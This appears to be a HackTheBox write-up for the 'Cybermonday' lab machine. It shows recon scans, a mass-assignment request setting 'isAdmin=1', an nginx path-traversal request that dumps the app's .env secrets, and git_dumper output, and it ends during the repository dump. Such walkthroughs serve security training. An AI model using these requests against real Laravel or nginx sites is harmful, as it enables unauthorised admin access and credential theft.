# Cybermonday

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.114.229
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 05:53 UTC
Nmap scan report for 10.129.114.229
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 74:68:14:1f:a1:c0:48:e5:0d:0a:92:6a:fb:c1:0c:d8 (RSA)
|   256 f7:10:9d:c0:d1:f3:83:f2:05:25:aa:db:08:0e:8e:4e (ECDSA)
|_  256 2f:64:08:a9:af:1a:c5:cf:0f:0b:9b:d2:95:f5:92:32 (ED25519)
80/tcp open  http    nginx 1.25.1
|_http-server-header: nginx/1.25.1
|_http-title: Did not follow redirect to http://cybermonday.htb
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/20%OT=22%CT=1%CU=42694%PV=Y%DS=2%DC=T%G=Y%TM=64E1AA7
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11
OS:NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE8
OS:8%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53
OS:ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   97.22 ms  10.10.16.1
2   121.22 ms 10.129.114.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.114.229
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 05:56 UTC
Nmap scan report for cybermonday.htb (10.129.114.229)
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 74:68:14:1f:a1:c0:48:e5:0d:0a:92:6a:fb:c1:0c:d8 (RSA)
|   256 f7:10:9d:c0:d1:f3:83:f2:05:25:aa:db:08:0e:8e:4e (ECDSA)
|_  256 2f:64:08:a9:af:1a:c5:cf:0f:0b:9b:d2:95:f5:92:32 (ED25519)
80/tcp open  http    nginx 1.25.1
|_http-title: Welcome - Cyber Monday
|_http-server-header: nginx/1.25.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/20%OT=22%CT=1%CU=40577%PV=Y%DS=2%DC=T%G=Y%TM=64E1AB2
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   111.76 ms 10.10.16.1
2   135.68 ms cybermonday.htb (10.129.114.229)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.55 seconds
```

```c
$ sudo nmap -sV -sU 10.129.114.229           
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 05:57 UTC
Nmap scan report for cybermonday.htb (10.129.117.242)
Host is up (0.18s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1144.50 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.114.229/

We got redirected to `cybermonday.htb` which we added to our `/etc/hosts` file.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.114.229  cybermonday.htb
```

> http://cybermonday.htb/

```c
$ whatweb http://cybermonday.htb/
http://cybermonday.htb/ [200 OK] Cookies[XSRF-TOKEN,cybermonday_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.25.1], HttpOnly[cybermonday_session], IP[10.129.114.229], PHP[8.1.20], Script, Title[Welcome - Cyber Monday], X-Powered-By[PHP/8.1.20], X-UA-Compatible[IE=edge], nginx[1.25.1]
```

> http://cybermonday.htb/signup

> http://cybermonday.htb/login

> http://cybermonday.htb/products

> http://cybermonday.htb/product/1

We created an account and logged in.

| Username | Email | Password |
| --- | --- | --- |
| foobar | foobar@foobar.local | foobar |

> http://cybermonday.htb/home/profile

We also registered a new user called `admin` and intercepted the request with `Burp Suite`.

| Username | Email | Password |
| --- | --- | --- |
| admin | admin@cybermonday.htb | admin |

Request:

```c
POST /signup HTTP/1.1
Host: cybermonday.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: http://cybermonday.htb
DNT: 1
Connection: close
Referer: http://cybermonday.htb/signup
Cookie: cybermonday_session=eyJpdiI6ImZhU1dWeGxLcVFDU1p6YXBnV1hoVXc9PSIsInZhbHVlIjoiM1ZSNEZRcktCSUQ1NVByallKYVVKdkxZU3NVRG5jUTN2T2VMczRORUozelZEVE11UmxJU2ZzT0tHMzdWOU44d3pQY0FvR3BvcCtFOGE5SlA0azlIQis1NmhKKytwWEN6MXVYWWkvaWwvQlJKM1pJeEVTRG1mSElNT1NHd0tzRnciLCJtYWMiOiJiYjIyZTE1MGVjODBlZWYwNzU0N2Y2YjYzOTM2ZjE1MjNmMTllMTY3ZTlhMzFhM2ZjNGIxZjhmMDdlYjc3ZGI2IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IkpoY0R3K2VZMDlTdXBSYUliV2Q2MUE9PSIsInZhbHVlIjoiaG84OThFYWVkNWNkaEVHMWJiV1JGbU9zalFqcm9wNWt1d1VhQ055bVlzWHJFVTMrd1ltcFRyRDlDTW15Z3UxWUhpOHFuRVo5SndPQjExYkVld0pzZklVdjdhTXVLNHpuclh4SGU5VWdlRWs1WFFQWGgzZC9LaUVxRlVFNThWdDAiLCJtYWMiOiI3NzcwMmFlMTJjNDIxZDZjNjRmNTI2YmE3NmJhY2VkMDUwZjhlOGY1NjJiZTg4MDQ5ZWNkNTZjYTkyYzg2YzhmIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

_token=hople0PlEYRMsuOHmDROoUUsxEeb5Kc4KDqAMDNO&username=admin&email=admin%40cybermonday.htb&password=admin
```

After forwarding the request, the website crashed and leaked some useful information.

```c
Illuminate\Database\QueryException
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'admin' for key 'users.users_username_unique' 
insert into `users` (`username`, `email`, `password`, `updated_at`, `created_at`) values (admin, admin@cybermonday.htb, $2y$10$ZEc47MlLKizxzUpknNyvGu0J7eqXgAS/2y6110Lh5m5UfKGa9EsxW, 2023-08-21 12:10:33, 2023-08-21 12:10:33)
```

| Hash |
| --- |
| $2y$10$ZEc47MlLKizxzUpknNyvGu0J7eqXgAS/2y6110Lh5m5UfKGa9EsxW |

| Position | Value |
| --- | --- |
| Php Version | 8.1.20 |
| Laravel Version | 9.46.0 |
| Laravel Locale | en |
| Laravel Config Cached | false |
| App Debug | true |
| App Env | local |

```c
curl "http://cybermonday.htb/signup" \
   -X POST \
   -H 'upgrade-insecure-requests: 1' \
   -H 'cookie: XSRF-TOKEN=eyJpdiI6ImV3ZWw3djFKdmJKZkJ0U3lZK1lxcnc9PSIsInZhbHVlIjoidlJIZjJaQVRTd0l3d1ZDUlVuUTRnblB5QW5nc243QWttNXF3L2hWc01tYXBXS3BJY0pRamVnMHI2VzN5azJWb0hJeXRjV0NLMW40cWU2R3Z4eHpaK3pIV210b25UR3RhbGk0MFRwbUN0S1l1Vnpoc2xlbDlQNmthWjk5VE44LzYiLCJtYWMiOiJiMTlmZDc1NTg4MDg5NjA1ZDFkZWQ4ZjUzMjMzOTJmYmMwMTc3YzM5ZTI0NjQxOTBkNzRhNGJiZGYzM2JlOTY2IiwidGFnIjoiIn0%3D; cybermonday_session=eyJpdiI6IlJmUW8vRFRnMUtiQy92ZmtMdlI2Q2c9PSIsInZhbHVlIjoieGFQSlkxNFJiUXJnMGNwWkJDVHJ0SCt2cHJpbzRrc3RvSExxdzNPemdnUG9pWkRrNWZHV3RoUk5iQ2EvNm8xVU1jT1hRcFFJTDl6MkhqQmNmbERJOHllR3dmZlFDM2tZWk1pRGFaYW9NbzhFSFdISDlMUlhSTGYrL1FrMnNiUmoiLCJtYWMiOiI0ODI1N2E5YjhmYzJhNmUyNDRlNmQ4NDQzNTlhM2MwMmQyMDgwNGEyNjBhZDEyZmM2MDg1YWMwNzkwOWY0MDQxIiwidGFnIjoiIn0%3D' \
   -H 'referer: http://cybermonday.htb/signup' \
   -H 'connection: close' \
   -H 'origin: http://cybermonday.htb' \
   -H 'content-length: 108' \
   -H 'content-type: application/x-www-form-urlencoded' \
   -H 'accept-encoding: gzip, deflate' \
   -H 'accept-language: en-US,en;q=0.5' \
   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
   -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' \
   -H 'host: cybermonday.htb' \
   -F '_token=Ft9ZLplXswg5QGgVerufbywU7IxbaYaR89jYHSFN' -F 'username=admin' -F 'email=admin@cybermonday.htb' -F 'password=<CENSORED>'
```

## Make youself Admin with Mass Assignment Vulnerability

We moved to the profile of our newly created user and updated it while intercepting the request with `Burp Suite`.

> https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html

Payload:

```c
&isAdmin=1
```

Modified Request:

```c
POST /home/update HTTP/1.1
Host: cybermonday.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 136
Origin: http://cybermonday.htb
DNT: 1
Connection: close
Referer: http://cybermonday.htb/home/profile
Cookie: cybermonday_session=eyJpdiI6IktoU3ZOaHZRWlp3VzN6QWhsdmEwZ0E9PSIsInZhbHVlIjoibzY5a2pvOSt2bVpTcWhxcWhGcUp5MnBHNGRZZGR2azVjMW5WZm4zT05oTWM5ZW9hUTM0V2Y2a1dQNUEzU1VjVmVpZzNSVjZWRnBpTVQybVlaSGNNSmNlc2x5Z25EOHVnRTQzVWd2OUw3bGNwNWNYMVhPV3g2MTJ3d2puZWlITU0iLCJtYWMiOiJiNDk0MmU5YjUwNWM2NTk0M2JiY2QzMzQxZTM3YWU3YjY1ZTAyMTgwNTIyMmVhMDQ5OTc5MzY1YTNjNzMxNThlIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IjNmMS95WWVNd1FLYmxvYnZ4a2hqUEE9PSIsInZhbHVlIjoiVE41djJyQkNja0p3a051amkveDlBUFVPeUJXbHNUWnBzY0xyemd4ZkZFTjlmTlZMZW44c1hGNHZTbTg2TGhIL0IvOWZ1Vm5ZY2N1NlRPUHZhMjF6eXR3YzVjalhVUlJYc2s4RFRMVHQ3ZERvbGhFamUyd0lpM1hKckFyU1F3OWsiLCJtYWMiOiI4NTcwMjI3OGUzZDUxMzA1M2YxZGZkNjk1YjEzMjg1ZjRhZDMyNmUzZDBjOGNlYjc1ZGNmMDBmYWMwMGY0ZThiIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

_token=wmcIrKVZFa8hhGBU1phMsOJpzwGDDsumF3bO7Z5C&username=foobar&email=foobar%40foobar.local&password=foobar&password_confirmation=foobar&isAdmin=1
```

We switched to the `Changelog` and found a new `Subdomain`.

> http://cybermonday.htb/dashboard/changelog

> http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77

| Subdomain |
| --- |
| webhooks-api-beta.cybermonday.htb |

## Playing around with the API

We added this to our `/etc/hosts` file.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.114.229  cybermonday.htb
10.129.114.229  webhooks-api-beta.cybermonday.htb
```

```c
$ curl http://webhooks-api-beta.cybermonday.htb/ | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   482    0   482    0     0   1330      0 --:--:-- --:--:-- --:--:--  1327
{
  "status": "success",
  "message": {
    "routes": {
      "/auth/register": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/auth/login": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/webhooks": {
        "method": "GET"
      },
      "/webhooks/create": {
        "method": "POST",
        "params": [
          "name",
          "description",
          "action"
        ]
      },
      "/webhooks/delete:uuid": {
        "method": "DELETE"
      },
      "/webhooks/:uuid": {
        "method": "POST",
        "actions": {
          "sendRequest": {
            "params": [
              "url",
              "method"
            ]
          },
          "createLogFile": {
            "params": [
              "log_name",
              "log_content"
            ]
          }
        }
      }
    }
  }
}
```

We created a new user.

```c
$ curl -X POST http://webhooks-api-beta.cybermonday.htb/auth/register -H "Content-Type: application/json" -d '{"username": "barfoo", "password": "barfoo"}'
{"status":"success","message":"success"}
```

And logged in.

```c
$ curl -X POST http://webhooks-api-beta.cybermonday.htb/auth/login -H "Content-Type: application/json" -d '{"username": "barfoo", "password": "barfoo"}'
{"status":"success","message":{"x-access-token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJiYXJmb28iLCJyb2xlIjoidXNlciJ9.psg2aZQGd9RBRYPB06RH4rIWFYd_u9p0Gp5ABBtPCZKJQpiX8bLqXEIDB1LX3SuCo2v3ITzUhbkKSlUt-GPSsOQw48euIrw9dr3xCV3Zm99YNEiectIH0gygvVF0W0gI3S-yAqUqjxEWXG3U1POe7YuueR0PjFvVBkGyDOs_e5hGBqswNKmnBR2JwabVkkLLxlcmr15OBI_2BN78s1U80q7ITiygDv6md2QCe24dItM3YYFRccqpGCo6kp3owORow-NL5eeyS1Usgpj_IR7gXvTF3BveTgZsiOKaP8ITzYuKfk4Xr3CgPTL9dqXzgJ4VLJC0yBQ9Yc4wq8bmYAe5-g"}}
```

### Local File Inclusion (LFI)

```c
$ curl http://cybermonday.htb/assets../.env --path-as-is
APP_NAME=CyberMonday
APP_ENV=local
APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
APP_DEBUG=true
APP_URL=http://cybermonday.htb

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=db
DB_PORT=3306
DB_DATABASE=cybermonday
DB_USERNAME=root
DB_PASSWORD=root

BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DISK=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=redis
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=redis
REDIS_PASSWORD=
REDIS_PORT=6379
REDIS_PREFIX=laravel_session:
CACHE_PREFIX=

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"

CHANGELOG_PATH="/mnt/changelog.txt"

REDIS_BLACKLIST=flushall,flushdb
```

| APP_KEY |
| --- |
| EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA= |

| REDIS_HOST |
| --- |
| redis |

We noticed a `password-less` on the `redis` backend which pointed us to a potential foothold through `Server-Side Request Forgery`.

## More Enumeration through Directory Busting with Gobuster

```c
$ dirsearch  -u http://cybermonday.htb/assets..
/home/user/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.16) or chardet (5.1.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/user/.dirsearch/reports/cybermonday.htb/-assets.._23-08-22_07-23-55.txt

Error Log: /home/user/.dirsearch/logs/errors-23-08-22_07-23-55.log

Target: http://cybermonday.htb/assets../

[07:23:55] Starting: 
[07:23:57] 200 -   10B  - /assets../.dockerignore                          
[07:23:57] 200 -  258B  - /assets../.editorconfig                          
[07:23:57] 200 -    1KB - /assets../.env                                   
[07:23:57] 200 -  912B  - /assets../.env.example                           
[07:23:57] 301 -  169B  - /assets../.git  ->  http://cybermonday.htb/assets../.git/
[07:23:57] 403 -  555B  - /assets../.git/                                  
[07:23:57] 200 -   92B  - /assets../.git/config
[07:23:57] 403 -  555B  - /assets../.git/branches/
[07:23:57] 200 -    7B  - /assets../.git/COMMIT_EDITMSG                    
[07:23:57] 200 -   23B  - /assets../.git/HEAD                              
[07:23:57] 403 -  555B  - /assets../.git/hooks/
[07:23:57] 200 -   73B  - /assets../.git/description
[07:23:57] 403 -  555B  - /assets../.git/info/                             
[07:23:57] 403 -  555B  - /assets../.git/logs/
[07:23:57] 200 -  147B  - /assets../.git/logs/HEAD
[07:23:57] 200 -  147B  - /assets../.git/logs/refs/heads/master            
[07:23:57] 403 -  555B  - /assets../.git/objects/                          
[07:23:57] 200 -  240B  - /assets../.git/info/exclude
[07:23:57] 301 -  169B  - /assets../.git/logs/refs  ->  http://cybermonday.htb/assets../.git/logs/refs/
[07:23:57] 301 -  169B  - /assets../.git/logs/refs/heads  ->  http://cybermonday.htb/assets../.git/logs/refs/heads/
[07:23:57] 403 -  555B  - /assets../.git/refs/
[07:23:57] 200 -   41B  - /assets../.git/refs/heads/master
[07:23:57] 200 -  152B  - /assets../.gitattributes                         
[07:23:57] 301 -  169B  - /assets../.git/refs/heads  ->  http://cybermonday.htb/assets../.git/refs/heads/
[07:23:58] 301 -  169B  - /assets../.git/refs/tags  ->  http://cybermonday.htb/assets../.git/refs/tags/
[07:23:58] 200 -  179B  - /assets../.gitignore
[07:23:58] 200 -   12KB - /assets../.git/index                             
[07:23:59] 200 -  162B  - /assets../.styleci.yml                            
[07:24:02] 200 -  435B  - /assets../Dockerfile                              
[07:24:02] 200 -    4KB - /assets../README.md                               
[07:24:32] 301 -  169B  - /assets../app  ->  http://cybermonday.htb/assets../app/
[07:24:32] 403 -  555B  - /assets../app/                                    
[07:24:43] 200 -    2KB - /assets../composer.json                           
[07:24:43] 301 -  169B  - /assets../config  ->  http://cybermonday.htb/assets../config/
[07:24:44] 403 -  555B  - /assets../config/                                 
[07:24:46] 200 -  281KB - /assets../composer.lock                           
[07:24:47] 301 -  169B  - /assets../database  ->  http://cybermonday.htb/assets../database/
[07:24:47] 403 -  555B  - /assets../database/
[07:25:04] 301 -  169B  - /assets../lang  ->  http://cybermonday.htb/assets../lang/
[07:25:18] 200 -  473B  - /assets../package.json                            
[07:25:22] 200 -    1KB - /assets../phpunit.xml                             
[07:25:27] 301 -  169B  - /assets../public  ->  http://cybermonday.htb/assets../public/
[07:25:29] 301 -  169B  - /assets../resources  ->  http://cybermonday.htb/assets../resources/
[07:25:29] 403 -  555B  - /assets../resources/                              
[07:25:39] 301 -  169B  - /assets../storage  ->  http://cybermonday.htb/assets../storage/
[07:25:39] 403 -  555B  - /assets../storage/                                
[07:25:39] 200 -    1B  - /assets../storage/logs/laravel.log                
[07:25:43] 403 -  555B  - /assets../tests/                                  
[07:25:43] 301 -  169B  - /assets../tests  ->  http://cybermonday.htb/assets../tests/
[07:25:53] 403 -  555B  - /assets../vendor/                                 
[07:25:54] 200 -    1KB - /assets../vendor/composer/LICENSE                 
[07:25:57] 200 -  559B  - /assets../webpack.mix.js                          
[07:25:57] 200 -  297KB - /assets../vendor/composer/installed.json          
                                                                             
Task Completed
```

## Dumping Git Repository

```c
$ python3 git_dumper.py http://cybermonday.htb/assets../ dump
/home/user/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.16) or chardet (5.1.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
Warning: Destination 'dump' is not empty
[-] Testing http://cybermonday.htb/assets../.git/HEAD [200]
[-] Testing http://cybermonday.htb/assets../.git/ [403]
[-] Fetching common files
[-] Already downloaded http://cybermonday.htb/assets../.git/COMMIT_EDITMSG
[-] Already downloaded http://cybermonday.htb/assets../.git/description
[-] Already downloaded http://cybermonday.htb/assets../.git/hooks/applypatch-msg.sample
[-] Already downloaded http://cybermonday.htb/assets../.git/hooks/commit-msg.sample
[-] Already downloaded http://cybermonday.htb/assets../.git/hooks/post-update.sample
[-] Already downloaded http://cybermonday.htb/assets../.git/hooks/pre-applypatch.sample
[-] Already downloaded http://cybermonday.htb/assets../.git/hooks/pre-commit.sample
[-] Already downloaded http://cybermonday.htb/assets../.git/hooks/pre-push.sample
[-] Already downloaded http://cybermonday.htb/assets../.git/hooks/pre-rebase.sample
[-] Already downloaded http://cybermonday.htb/assets../.git/hooks/pre-receive.sample
[-] Already downloaded http://cybermonday.htb/assets../.git/hooks/prepare-commit-msg.sample
[-] Already downloaded http://cybermonday.htb/assets../.git/hooks/update.sample
[-] Already downloaded http://cybermonday.htb/assets../.git/index
[-] Already downloaded http://cybermonday.htb/assets../.git/info/exclude
[-] Fetching http://cybermonday.htb/assets../.git/hooks/post-receive.sample [404]
[-] http://cybermonday.htb/assets../.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/hooks/post-commit.sample [404]
[-] Fetching http://cybermonday.htb/assets../.gitignore [200]
[-] http://cybermonday.htb/assets../.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/objects/info/packs [404]
[-] http://cybermonday.htb/assets../.git/objects/info/packs responded with status code 404
[-] Finding refs/
[-] Fetching http://cybermonday.htb/assets../.git/HEAD [200]
[-] Fetching http://cybermonday.htb/assets../.git/FETCH_HEAD [404]
[-] http://cybermonday.htb/assets../.git/FETCH_HEAD responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/logs/HEAD [200]
[-] Fetching http://cybermonday.htb/assets../.git/config [200]
[-] Fetching http://cybermonday.htb/assets../.git/logs/refs/remotes/origin/HEAD [404]
[-] http://cybermonday.htb/assets../.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/info/refs [404]
[-] Fetching http://cybermonday.htb/assets../.git/logs/refs/remotes/origin/master [404]
[-] http://cybermonday.htb/assets../.git/info/refs responded with status code 404
[-] http://cybermonday.htb/assets../.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/logs/refs/heads/master [200]
[-] Fetching http://cybermonday.htb/assets../.git/ORIG_HEAD [404]
[-] http://cybermonday.htb/assets../.git/ORIG_HEAD responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/logs/refs/stash [404]
[-] http://cybermonday.htb/assets../.git/logs/refs/stash responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/heads/master [200]
[-] Fetching http://cybermonday.htb/assets../.git/refs/remotes/origin/HEAD [404]
[-] Fetching http://cybermonday.htb/assets../.git/packed-refs [404]
[-] http://cybermonday.htb/assets../.git/refs/remotes/origin/HEAD responded with status code 404
[-] http://cybermonday.htb/assets../.git/packed-refs responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/remotes/origin/master [404]
[-] http://cybermonday.htb/assets../.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/stash [404]
[-] http://cybermonday.htb/assets../.git/refs/stash responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/wip/wtree/refs/heads/master [404]
[-] http://cybermonday.htb/assets../.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/wip/index/refs/heads/master [404]
[-] http://cybermonday.htb/assets../.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/76/a559577d4f759fff6af1249b4a277f352822d5
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/88/16d69710c5d2ee58db84afa5691495878f4ee1
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/5f/ec5e0946296a0f09badeb08571519918c3da77
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/8a/62aac3b8e9105766f3873443758b7ddf18d838
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/49/cd436cf92cc28645e5a8be4b1973683c95c537
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/dc/446514835fe49994e27a1c2cf35c9e45916c71
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1
[-] Already downloaded http://cybermonday.htb/assets../.git/objects/b6/c438e8ba16336198c2e62fee337e126257b909
